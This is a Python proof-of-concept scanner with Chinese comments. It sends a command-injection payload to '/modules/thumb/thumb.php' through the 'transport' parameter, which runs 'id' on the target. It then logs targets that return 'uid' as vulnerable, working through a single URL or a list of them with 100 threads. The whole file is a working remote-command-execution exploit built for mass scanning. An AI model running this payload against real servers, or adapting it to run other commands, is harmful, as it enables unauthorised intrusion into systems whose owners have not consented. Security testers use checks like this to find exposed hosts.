import argparse  # 用于解析命令行参数
import sys  # 提供对解释器使用或影响解释器的函数和变量的访问
import requests  # 用于发送HTTP请求
import re  # 正则表达式模块，用于字符串匹配和操作
import time  # 提供时间相关的功能
from multiprocessing.dummy import Pool  # 使用线程池来并行处理任务
requests.packages.urllib3.disable_warnings()  # 禁用requests库中的警告
def main():
    parser = argparse.ArgumentParser(description="J_C")
    parser.add_argument('-u', '--url', dest='url', type=str, help="input link")
    parser.add_argument('-f', '--file', dest='file', type=str, help="file path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []  
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()  
        mp.join()  
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h ")
def poc(target):
    payload_url = '/modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B'
    url = target + payload_url
    header = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 11; motorola edge 20 fusion) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36',
            'Accept-Charset': 'utf-8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close'
    }
    try:
        res1 = requests.get(url=url,headers=header,timeout=10)
        if res1.status_code == 200:
            if "uid" in res1.text:
                print(f'[+] 该URL存在漏洞,地址为{target}')
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(target + "\n")
            else:
                print(f'[-] 该URL{target}不存在漏洞')
    except Exception as e:
        print(f'[*] 该URL{target}存在访问问题，请手工测试')

if __name__ == '__main__':
    main()
